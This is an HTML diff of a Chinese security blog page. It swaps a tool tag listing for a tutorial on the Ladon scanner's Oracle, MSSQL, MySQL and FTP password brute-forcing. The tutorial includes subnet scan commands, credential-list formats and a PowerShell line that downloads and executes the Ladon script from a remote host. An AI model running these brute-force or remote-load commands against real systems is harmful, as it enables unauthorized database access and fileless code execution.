@@ -19,10 +19,14 @@
     <link rel="dns-prefetch" href="http://k8gege.org">
     <!--SEO-->
 
-<meta name="keywords" content="K8博客，K8哥哥，Ladon，K8tools，Exploit，GetShell，扫描器，黑客，网络安全，信息安全，渗透测试，内网渗透，提权工具">
+<meta name="keywords" content>
 
 
-<meta name="description" content="没有绝对安全的系统！！！K8博客，K8哥哥，Ladon，K8tools，Exploit，GetShell，扫描器，黑客，网络安全，信息安全，渗透测试，内网渗透，提权工具 ">
+<meta name="description" content=" 
+
+
+
+Ladon1521端口 Oracle数据库密码爆破Oracle不同于MS SQL Server和Mysql数据库，可对用户配置权限数据库名不对，是无法连接上数据库的，比方说你获取到的密...">
 
 
 <meta name="robots" content="all">
@@ -33,7 +37,7 @@
 
 <title>
     
-    Tag: Tool |
+    Ladon OracleScan 1521端口弱口令/Oracle数据库密码爆破 |
     
     K8哥哥’s Blog
 </title>
@@ -150,290 +154,40 @@
         <div class="container">
             <div class="row">
                 <main class="col-md-8 main-content ">
-                    <ol class="breadcrumb">
+                    <div>
     
-    <li>
-        Tool
-    </li>
-    
-    
-</ol>
+    <article class="post">
+    <h1 class="post-head">
+        Ladon OracleScan 1521端口弱口令/Oracle数据库密码爆破
+    </h1>
+    <div class="post-body">
+        <p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
 
-<article class="post">
-    
-    <div class="post-media">
-        <a href="/p/Ladon.html">
-            <img class="img-ajax" data-src="https://img-blog.csdnimg.cn/20210117163101549.jpg" alt="〖工具〗Ladon模块化网络渗透工具&Cobalt Strike" data-original="/img/loading.gif">
-        </a>
-    </div>
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/Ladon.html">
-                    〖工具〗Ladon模块化网络渗透工具&Cobalt Strike</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2022/09/11
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            Ladon一款用于大型内网渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、密码读取、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。11.6版本内置252个功能模块……
-            
-        </p>
+%>
+</%></p>
+
+<h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h3 id="1521端口-Oracle数据库密码爆破"><a href="#1521端口-Oracle数据库密码爆破" class="headerlink" title="1521端口 Oracle数据库密码爆破"></a>1521端口 Oracle数据库密码爆破</h3><p>Oracle不同于MS SQL Server和Mysql数据库，可对用户配置权限<br>数据库名不对，是无法连接上数据库的，比方说你获取到的密码<br>是oracle admin123 对应连接的是db888数据库 就是所说的SID<br>但是网上很多工具都是使用默认的orcl数据库 导致无法爆破<br>有可能会因此错过很多Oracle数据库机器权限 所以我选Ladon</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 OracleScan</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OracleScan_up.png"></p>
+<h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
+<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
+<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p>
+<h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
+<h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p>
+<h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p>
+<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载FtpScan-21端口弱口令爆破"><a href="#远程加载FtpScan-21端口弱口令爆破" class="headerlink" title="远程加载FtpScan 21端口弱口令爆破"></a>远程加载FtpScan 21端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon6.6_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon6.6_all.ps1&#39;</a>); Ladon 192.168.1.141 FtpScan”<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/ps/ps_ftpscan.PNG"></p>
+<h5 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h5><p>mono Ladon 192.168.1.8/24 FtpScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/FtpScan.gif"></p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
     </div>
 </article>
-
-<article class="post">
     
-    <div class="post-media">
-        <a href="/p/Ladon-en.html">
-            <img class="img-ajax" data-src="https://img-blog.csdnimg.cn/20210117163101549.jpg" alt="〖Tool〗Ladon modular hacking framework" data-original="/img/loading.gif">
-        </a>
-    </div>
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/Ladon-en.html">
-                    〖Tool〗Ladon modular hacking framework</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2022/09/11
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            Ladon is a multi-threaded plug-in comprehensive scanning artifact for large-scale intranet penetration, including port scanning, service identification, network assets, password blasting, high-risk vulnerability detection and one click getshell. It supports batch segment A / segment B / segment C and cross network segment scanning, as well as URL, host and domain name list scanning. Version 11.6 has 252 built-in functional modules……
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-media">
-        <a href="/p/56393.html">
-            <img class="img-ajax" data-src="http://k8gege.org/k8img/Ladon/Dragon.jpg" alt="Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破" data-original="/img/loading.gif">
-        </a>
-    </div>
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/56393.html">
-                    Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/06/12
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-                 
-Ladon6.0新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、进程详细信息获取、渗透相关信息获取、命令行参数信息操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化
-更新日志
-
-
-动作
-模块
-说明
-
-...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/55476.html">
-                    Ladon 6.4新增Linux系统探测、管理员提权System降权</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/04/20
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            前言你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？SYSTEM权限下截取不到目标桌面？ADMIN权限下打不开SYSTEM权限进程？如何切换各种权限测试工...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/39070.html">
-                    Ladon 6.2新增Ntlm Hash爆破每分钟可破4万个密码</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/03/30
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            前言天下武功,无坚不破,唯快不破。扫描速度 SMB &amp;gt; Wmi ，但是SMB通不代表WMI通。每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。
-Ladon6.2更新功能ID | 模块名称 |  功能...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-media">
-        <a href="/p/60379.html">
-            <img class="img-ajax" data-src="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif" alt="Ladon for MacOS" data-original="/img/loading.gif">
-        </a>
-    </div>
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/60379.html">
-                    Ladon for MacOS</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/03/30
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            
-     
-前言在尘封已久的笔记本上安装mono后测试Ladon，确实支持苹果系统。当初没环境一直没测，和大家说理论上支持，现已证实。
-测试环境：Mac 10.15.3mono 6.6.0.166一不小心装的都是最新版，大家也可以在...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/c5430395.html">
-                    Ladon For Cobalt Strike 4.0</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/03/30
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            前言Ladon 6.2支持Cobalt Strike 4.0,内置58个功能加载脚本Ladon.cna,通过Beacon命令或右键使用
-应用场景CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等跳板扫描外网资产(即无需代理...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-media">
-        <a href="/p/19321.html">
-            <img class="img-ajax" data-src="https://img-blog.csdnimg.cn/20210117163103552.jpg" alt="Windows提权工具 CVE-2019-1405 & CVE-2019-1322" data-original="/img/loading.gif">
-        </a>
-    </div>
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/19321.html">
-                    Windows提权工具 CVE-2019-1405 & CVE-2019-1322</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/01/15
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            漏洞介绍由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/12105.html">
-                    CVE-2016-3088 ActiveMQ GetShell Exploit</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/01/11
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            前言使用Exp生成器生成Ladon插件实战，CVE-2016-3088 ActiveMQ GetShell
-0x000 漏洞信息漏洞编号: CVE-2016-3088漏洞原理: ActiveMQ 中的 FileServer 服务允许用...
-            
-        </p>
-    </div>
-</article>
-
-<article class="post">
-    
-    <div class="post-content">
-        <div class="post-head home-post-head">
-            <h1 class="post-title">
-                <a href="/p/26286.html">
-                    ThinkPHP 5.0.22 5.1.29 GetShell Exploit</a>
-            </h1>
-            <div class="post-meta"> &bull;
-                <time class="post-date" datetime title>
-                    2020/01/11
-                </time>
-            </div>
-        </div>
-        <p class="brief">
-            
-            前言使用Exp生成器生成Ladon插件实战，ThinkPHP GetShell
-漏洞环境使用docker ThinkPHP 5.0.20
-复现测试Payload:http://192.168.1.37:8080/index.php?s...
-            
-        </p>
-    </div>
-</article>
-
-
-<nav class="pagination" role="navigation">
-    <div id="page-nav">
-
-        <span class="page-number current">1</span><a class="page-number" href="/tags/Tool/page/2/">2</a><a class="page-number" href="/tags/Tool/page/3/">3</a><a class="page-number" href="/tags/Tool/page/4/">4</a><a class="extend next" rel="next" href="/tags/Tool/page/2/">Next</a>
-    </div>
-</nav>
-
+</div>
                 </main>
                 
                     
